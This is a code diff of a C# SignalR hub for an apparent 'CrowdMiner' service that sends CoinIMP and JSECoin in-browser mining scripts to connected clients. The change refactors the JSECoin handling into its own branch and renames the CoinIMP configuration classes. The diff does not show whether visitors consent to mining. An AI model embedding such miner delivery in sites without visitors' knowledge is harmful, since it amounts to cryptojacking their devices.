@@ -165,13 +165,24 @@ namespace SignalRService.Hubs
             var dbservice = db.ServiceSettings.FirstOrDefault(ln => ln.ServiceUrl == name);
             if(dbservice != null)
             {
-                if (dbservice.ServiceType == Enums.EnumServiceType.CrowdMinerCoinIMP || dbservice.ServiceType == Enums.EnumServiceType.CrowdMinerJSECoin)
+                if (dbservice.ServiceType == Enums.EnumServiceType.CrowdMinerCoinIMP )
                 {
                     var mr = dbservice.MiningRooms.FirstOrDefault();
                     if (mr != null)
                     {
                         InitializeCulture(Context.Request);
                         var mri = Factories.MiningRoomFactory.GetImplementation(Enums.EnumMiningRoomType.CoinIMP);
+                        var mr_vm = mri.GetOverview(mr.Id);
+                        mri.SendRoomInfoUpdateToClient(mr_vm, Context.ConnectionId);
+                    }
+                }
+                if (dbservice.ServiceType == Enums.EnumServiceType.CrowdMinerJSECoin)
+                {
+                    var mr = dbservice.MiningRooms.FirstOrDefault();
+                    if (mr != null)
+                    {
+                        InitializeCulture(Context.Request);
+                        var mri = Factories.MiningRoomFactory.GetImplementation(Enums.EnumMiningRoomType.JSECoin);
                         var mr_vm = mri.GetOverview(mr.Id);
                         mri.SendRoomInfoUpdateToClient(mr_vm, Context.ConnectionId);
                     }
@@ -693,7 +704,7 @@ namespace SignalRService.Hubs
         public async Task<WorkData> ClientRequestWork()
         {
             //default, in case nothin in db - and for delay / statusinterval which are not in db for now
-            //var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
+            //var CoinIMPMinerConfigurationViewModel = new SignalRService.ViewModels.CoinIMPMinerConfigurationViewModel()
             //{
             //    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
             //    Throttle = "0.9",
@@ -702,8 +713,8 @@ namespace SignalRService.Hubs
             //    ReportStatusIntervalMs = 65000
             //};
 
-            ViewModels.MinerConfigurationViewModel MinerConfigurationViewModel = new ViewModels.MinerConfigurationViewModel();
-            var dbMinerConfig = db.MinerConfiurationModels.FirstOrDefault();
+            ViewModels.CoinIMPMinerConfigurationViewModel MinerConfigurationViewModel = new ViewModels.CoinIMPMinerConfigurationViewModel();
+            var dbMinerConfig = db.CoinIMPMinerConfiurationModels.FirstOrDefault();
             if(dbMinerConfig == null)
             {
                 SimpleLogger logger = new SimpleLogger();
@@ -711,7 +722,7 @@ namespace SignalRService.Hubs
             }
             else
             {
-                MinerConfigurationViewModel = dbMinerConfig.ToMinerConfigurationViewModel();
+                MinerConfigurationViewModel = dbMinerConfig.ToCoinIMPMinerConfigurationViewModel();
             }
            
             var data = Utils.RenderUtils.RenderMinerScript(MinerConfigurationViewModel.ClientId, MinerConfigurationViewModel.Throttle, MinerConfigurationViewModel.ScriptUrl, MinerConfigurationViewModel.StartDelayMs, MinerConfigurationViewModel.ReportStatusIntervalMs, true);
